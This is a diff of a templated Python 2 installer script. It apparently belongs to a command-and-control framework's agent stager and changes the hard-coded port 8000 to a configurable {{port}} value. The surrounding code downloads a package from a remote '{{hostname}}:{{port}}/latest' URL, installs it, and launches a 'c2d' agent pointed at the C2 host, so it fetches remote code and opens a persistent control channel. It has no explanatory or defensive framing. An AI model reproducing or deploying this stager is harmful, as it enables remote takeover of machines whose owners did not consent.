@@ -15,9 +15,9 @@ if __name__ == "__main__":
 
     os.chdir('agent')
     if {{ ssl }}:
-        url = "https://{{hostname}}/latest"
+        url = "https://{{hostname}}:{{port}}/latest"
     else:
-        url = "http://{{hostname}}/latest"
+        url = "http://{{hostname}}:{{port}}/latest"
 
     filename = re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0]
     whl = urllib.urlretrieve(url, filename)
@@ -25,8 +25,8 @@ if __name__ == "__main__":
     print '[+] Install succesfull, configuring host'
     host = '{{hostname}}'.split(':')[0]
     if {{ ssl }}:
-        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000', '--ssl'])
+        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '{{port}}', '--ssl'])
     else:
-        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000'])
+        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '{{port}}'])
 
 
